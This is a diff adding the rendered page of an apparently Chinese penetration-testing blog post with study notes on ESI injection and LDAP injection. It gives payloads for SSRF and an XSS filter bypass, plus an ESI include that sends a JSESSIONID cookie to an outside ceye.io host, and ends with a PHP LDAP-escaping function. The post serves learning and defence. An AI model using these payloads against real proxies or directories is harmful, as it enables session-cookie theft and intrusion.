@@ -1,37 +1,884 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
 
-{% block page_class %}page-post-detail{% endblock %}
+  
 
 
-{% block content %}
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="渗透测试," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="ESIEdge Side Includes (ESI)标记语言主要用于各种流行的HTTP代理中 如反向代理、负载均衡、缓存服务器、代理服务器   用以解决网页缓存问题。 攻击方式：对ESI的成功利用可形成SSRF、绕过HTTPOnly cookie标记的XSS攻击和服务端的拒绝服务攻击（ESI 注入（ESI Injection)） 支持ESI的应用：  Varnish，Squid Proxy，IB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ESI注入与LDAP注入学习">
+<meta property="og:url" content="http://laker.xyz/2019/08/08/ESI%E6%B3%A8%E5%85%A5%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="laker&#39;s Blog">
+<meta property="og:description" content="ESIEdge Side Includes (ESI)标记语言主要用于各种流行的HTTP代理中 如反向代理、负载均衡、缓存服务器、代理服务器   用以解决网页缓存问题。 攻击方式：对ESI的成功利用可形成SSRF、绕过HTTPOnly cookie标记的XSS攻击和服务端的拒绝服务攻击（ESI 注入（ESI Injection)） 支持ESI的应用：  Varnish，Squid Proxy，IB">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://laker.xyz/2019/08/08/ESI%E6%B3%A8%E5%85%A5%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/1565232040892.png">
+<meta property="og:image" content="http://laker.xyz/2019/08/08/ESI%E6%B3%A8%E5%85%A5%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/1565233032426.png">
+<meta property="og:image" content="http://laker.xyz/2019/08/08/ESI%E6%B3%A8%E5%85%A5%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/1565233218596.png">
+<meta property="og:image" content="http://laker.xyz/2019/08/08/ESI%E6%B3%A8%E5%85%A5%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/1565234527325.png">
+<meta property="og:image" content="http://laker.xyz/2019/08/08/ESI%E6%B3%A8%E5%85%A5%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/1565234971914.png">
+<meta property="og:image" content="http://laker.xyz/2019/08/08/ESI%E6%B3%A8%E5%85%A5%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/1565248377385.png">
+<meta property="og:image" content="http://laker.xyz/2019/08/08/ESI%E6%B3%A8%E5%85%A5%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/1565248966771.png">
+<meta property="article:published_time" content="2019-08-08T02:37:52.000Z">
+<meta property="article:modified_time" content="2019-08-18T08:16:30.000Z">
+<meta property="article:author" content="laker">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://laker.xyz/2019/08/08/ESI%E6%B3%A8%E5%85%A5%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/1565232040892.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://laker.xyz/2019/08/08/ESI注入与LDAP注入学习/"/>
+
+
+
+
+
+  <title>ESI注入与LDAP注入学习 | laker's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">laker's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">记录渗透测试琐事仅仅</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
 
   <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://laker.xyz/2019/08/08/ESI%E6%B3%A8%E5%85%A5%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="laker's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ESI注入与LDAP注入学习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-08T10:37:52+08:00">
+                2019-08-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="ESI"><a href="#ESI" class="headerlink" title="ESI"></a>ESI</h1><p>Edge Side Includes (ESI)标记语言主要用于各种流行的<strong>HTTP代理</strong>中</p>
+<p>如<strong>反向代理、负载均衡、缓存服务器、代理服务器</strong>   用以解决网页缓存问题。</p>
+<p>攻击方式：对ESI的成功利用可形成<strong>SSRF、绕过HTTPOnly cookie标记的XSS攻击和服务端的拒绝服务攻击</strong>（ESI 注入（ESI Injection)）</p>
+<p>支持ESI的应用：</p>
+<blockquote>
+<p>Varnish，Squid Proxy，IBM WebSphere，Oracle Fusion / WebLogic，Akamai，Fastly，F5，Node.js ESI，LiteSpeed</p>
+</blockquote>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">示例：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Weather for <span class="tag">&lt;<span class="name">esi:include</span> <span class="attr">src</span>=<span class="string">&quot;/weather/name?id=$(QUERY_STRING&#123;city_id&#125;)&quot;</span> /&gt;</span></span><br><span class="line">Monday: <span class="tag">&lt;<span class="name">esi:include</span> <span class="attr">src</span>=<span class="string">&quot;/weather/week/monday?id=$(QUERY_STRING&#123;city_id&#125;)&quot;</span> /&gt;</span></span><br><span class="line">Tuesday: <span class="tag">&lt;<span class="name">esi:include</span> <span class="attr">src</span>=<span class="string">&quot;/weather/week/tuesday?id=$(QUERY_STRING&#123;city_id&#125;)&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这其中的动态内容：</span><br><span class="line"><span class="tag">&lt;<span class="name">esi:include</span> <span class="attr">src</span>=<span class="string">&quot;/weather/name?id=$(QUERY_STRING&#123;city_id&#125;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">esi:include</span> <span class="attr">src</span>=<span class="string">&quot;/weather/week/monday?id=$(QUERY_STRING&#123;city_id&#125;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">esi:include</span> <span class="attr">src</span>=<span class="string">&quot;/weather/week/tuesday?id=$(QUERY_STRING&#123;city_id&#125;)&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我理解的相当于镶嵌一样</p>
+<p><img src="/2019/08/08/ESI%E6%B3%A8%E5%85%A5%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/1565232040892.png" alt="1565232040892"></p>
+<p>只有动态内容需要从主服务器中获取，然后又代理服务器进行整合镶嵌最终形成DOM返回给请求端。</p>
+<p>即代理服务器是实现媒介，具体如何标记<strong>静态与非静态</strong>（动态）内容的工作交给了ESI来进行描述。</p>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>​    在<strong>上游服务器</strong>响应的和恶意攻击者注入HTTP的ESI标签之间，<strong>HTTP代理</strong>（加速代理服务器）是不能区分合法ESI标签的</p>
+<p>也就是说，如果攻击者能成功把<strong>ESI标签注入到HTTP响应内容中</strong>，代理就会通过评估解析，认为它们是来自上游服务器响应的合法ESI标签。<strong>并且ESI解析器在处理ESI标签时，小于号&lt;和&gt;大于号之间的字符不会被编码或转义</strong></p>
+<p>如今，Web应用服务器会转义一些用户输入的特殊字符以防止XSS攻击，虽然这样能有效阻止代理解析后返回的ESI标签语义，但有时候ESI标签可以注入到非HTML形式的HTTP响应内容中去。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
+<li><p>服务端请求伪造（SSRF)</p>
+<p>​    值得注意的是，这里的SSRF造成的是对HTTP代理服务器的SSRF，由于其错误的解析了来自客户端的请求诸如<code>&lt;esi:include src=&quot;http://s5beqn.ceye.io&quot; /&gt;</code></p>
+<p>这样的ESI语言。不过这将不会攻伤害到真实的应用服务器。</p>
+<p>正常的处理流程</p>
+</li>
+</ul>
+<p><img src="/2019/08/08/ESI%E6%B3%A8%E5%85%A5%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/1565233032426.png" alt="1565233032426"></p>
+<p>​        成功的SSRF攻击导致的请求流程：</p>
+<p><img src="/2019/08/08/ESI%E6%B3%A8%E5%85%A5%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/1565233218596.png" alt="1565233218596"></p>
+<p>​    攻击Payload:</p>
+<p>​    <code>&lt;esi:include src=&quot;http://s5beqn.ceye.io&quot; /&gt;</code></p>
+<ul>
+<li><p>绕过客户端XSS过滤机制</p>
+<p>​    客户端XSS过滤机制一般通过请求输入和响应输出的比较来运行，当某些GET参数在HTTP响应中出现时，浏览器会启动安全过滤措施来识别是否存在XSS payload 攻击，如果浏览器识别到payload为HTML为Javascript，那么这种攻击就会被阻止(Chrome–xssAuditor)</p>
+<p>q=<strong>&lt;esi:assign name=”var1” value=”‘cript’”/&gt;</strong>&lt;s**&lt;esi:vars name=”$(var1)” /&gt;<strong>&gt;alert(/Chrome XSS filter bypass/);&lt;/s**&lt;esi:vars name=”$(var1)”/&gt;</strong>&gt;</p>
+<p>值得注意的是</p>
+<p><code>&lt;esi:assign name=&quot;var1&quot; value=&quot;&#39;cript&#39;&quot;/&gt;</code>   将定义一个var1变量值为cript</p>
+<p><code>&lt;esi:vars name=&quot;$(var1)&quot; /&gt; </code> 该ESI标记将被解析为cript再拼接形成最终解析返回（基于黑名单的过滤器将失效）:</p>
+<p>q=<code>&lt;script&gt;alert(/Chrome XSS filter bypass/);&lt;/script&gt;</code></p>
+<p><img src="/2019/08/08/ESI%E6%B3%A8%E5%85%A5%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/1565234527325.png" alt="1565234527325"></p>
+<p>攻击Payload:</p>
+<p><code>&lt;esi:assign name=&quot;var1&quot; value=&quot;&#39;cript&#39;&quot; /&gt;&lt;s&lt;esi:vars name=&quot;$(var1)&quot; /&gt;&gt;alert(/xss/);&lt;/s&lt;esi:vars name=&quot;$(var1)&quot; /&gt;&gt;</code></p>
+</li>
+</ul>
+<ul>
+<li><p>绕过HttpOnly Cookie标记</p>
+<p>​    针对Cookie窃取的一个对策是在Javascript引擎下使用HTTPOnly标记。这种标记在Cookie创建时被定义，阻断Javascript引擎对Cookie和其变量值的访问获取，防止Cookie窃取形式的XSS攻击。由于ESI是在服务器端被处理，当上游服务器向代理服务器传输Cookie时，可以利用这些Cookie。一种攻击途径就是使用ESI includes标签对URL中的cookie进行窃取。</p>
+<p>也就是在HTTP代理服务器直接传递Cookie给攻击者而不通过原本的客户电脑的浏览器（SSRF+ESI语言组合）</p>
+<p>攻击payload：</p>
+<p><code>&lt;esi:include src=&quot;http://s5beqn.ceye.io/?cookie=$(HTTP_COOKIE&#123;&#39;JSESSIONID&#39;&#125;)&quot; /&gt;</code></p>
+<p><img src="/2019/08/08/ESI%E6%B3%A8%E5%85%A5%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/1565234971914.png" alt="1565234971914"></p>
+<hr>
+<hr>
+<h1 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h1><p>​    LDAP(Lightweight Directory Access Protocol):轻量级目录访问协议，是一种在线目录访问协议。</p>
+<p>​    <strong>LDAP主要用于目录中资源的搜索和查询</strong>，是X.500的一种简便的实现。</p>
+<p>简单理解：LDAP是某种搜索协议，就像我们熟知的数据库一样，我们利用SQL语句进行查询数据库中的数据。而LDAP也有一套自己的查询语句，来进行查询。</p>
+<p>利用的前置知识：</p>
+<ul>
+<li><p>一个永真条件在LDAP语法中为  <strong>(&amp;)</strong></p>
+</li>
+<li><p>LDAP查询语法：(描述符(参数=值)(参数=值))</p>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search语法：attribute operator value</span><br><span class="line">search filter options:( &quot;&amp;&quot; or &quot;|&quot; (filter1) (filter2) (filter3) ...) (&quot;!&quot; (filter))</span><br></pre></td></tr></table></figure>
+
+<p>​    示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(attribute=value)(injected_filter)) (second_filter)</span><br></pre></td></tr></table></figure>
+
+<p>​    我们需要达到的，首先是对原本查询为</p>
+<p><code>(&amp;(parameter1=value1)(parameter2=value2))</code></p>
+<p><code>(|(parameter1=value1)(parameter2=value2))</code></p>
+<p>​    这样的查询再对用户可控参数value1和value2  进行构造、闭合 –&gt; 如value1=aaa**)**(&amp;))</p>
+<p>这样结果将成为:    (&amp;(parameter1=<strong>aaa)(&amp;))</strong>)(parameter2=value2))</p>
+<p><img src="/2019/08/08/ESI%E6%B3%A8%E5%85%A5%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/1565248377385.png" alt="1565248377385"></p>
+<p>当然，需要第二个框的部分被抛弃和第一个部分正确执行才可以。因此，该注入只有支持该语法的OpenLDAP支持，而微软的ADAM不存在该注入（不支持该语法）</p>
+<p>同理OR(描述符为|) 的LDAP注入亦是如此。</p>
+<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>下图包含了LDAP中用到的特殊字符和需要转义处理的字符：</p>
+<p><img src="/2019/08/08/ESI%E6%B3%A8%E5%85%A5%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/1565248966771.png" alt="1565248966771"></p>
+<p>可供参考的防御函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ldapspecialchars</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$sanitized</span>=<span class="keyword">array</span>(<span class="string">&#x27;\\&#x27;</span> =&gt; <span class="string">&#x27;\5c&#x27;</span>,</span><br><span class="line">                     <span class="string">&#x27;*&#x27;</span> =&gt; <span class="string">&#x27;\2a&#x27;</span>,</span><br><span class="line">                     <span class="string">&#x27;(&#x27;</span> =&gt; <span class="string">&#x27;\28&#x27;</span>,</span><br><span class="line">                     <span class="string">&#x27;)&#x27;</span> =&gt; <span class="string">&#x27;\29&#x27;</span>,</span><br><span class="line">                     <span class="string">&quot;\x00&quot;</span> =&gt; <span class="string">&#x27;\00&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str_replace(array_keys(<span class="variable">$sanitized</span>),array_values(<span class="variable">$sanitized</span>),<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>LDAP服务开启的端口  389 ，如果发现服务器上开启了该端口很可能就是开启了LDAP服务</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d94673be9ed0">https://www.jianshu.com/p/d94673be9ed0</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/168363.html">https://www.freebuf.com/articles/web/168363.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.360zhijia.com/anquan/367135.html">https://www.360zhijia.com/anquan/367135.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+    
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+  <script src="https://cdn.bootcss.com/sweetalert/2.1.2/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/sweetalert/1.1.2/sweetalert.min.css">
+
+  <p><span>本文标题:</span>ESI注入与LDAP注入学习</a></p>
+  <p><span>文章作者:</span></a></p>
+  <p><span>发布时间:</span>2019年08月08日 - 10:37:52</p>
+  <p><span>最后更新:</span>2019年08月18日 - 16:16:30</p>
+  <p><span>原始链接:</span><a href="/2019/08/08/ESI%E6%B3%A8%E5%85%A5%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" title="ESI注入与LDAP注入学习">http://laker.xyz/2019/08/08/ESI%E6%B3%A8%E5%85%A5%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://laker.xyz/2019/08/08/ESI%E6%B3%A8%E5%85%A5%E4%B8%8ELDAP%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
+</div>
+<script>
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({
+          title: "",
+          text: '复制成功',
+          html: false,
+          timer: 500,
+          showConfirmButton: false
+        });
+      });
+    }));
+</script>
+
+    
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/08/Docker%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/" rel="next" title="Docker使用记录">
+                <i class="fa fa-chevron-left"></i> Docker使用记录
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/08/08/Fastjson%E7%99%BD%E7%9B%92%E5%AD%A6%E4%B9%A0/" rel="prev" title="Fastjson白盒学习">
+                Fastjson白盒学习 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
 
     <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+      
     </div>
   </div>
 
-{% endblock %}
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+          </div>
+          
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.th3wind.xyz" title="th3wind" target="_blank">th3wind</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://damit5.com/" title="damit5" target="_blank">damit5</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ESI"><span class="nav-number">1.</span> <span class="nav-text">ESI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LDAP%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">LDAP注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1"><span class="nav-number">2.0.0.1.</span> <span class="nav-text">防御</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">laker</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+    <br>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
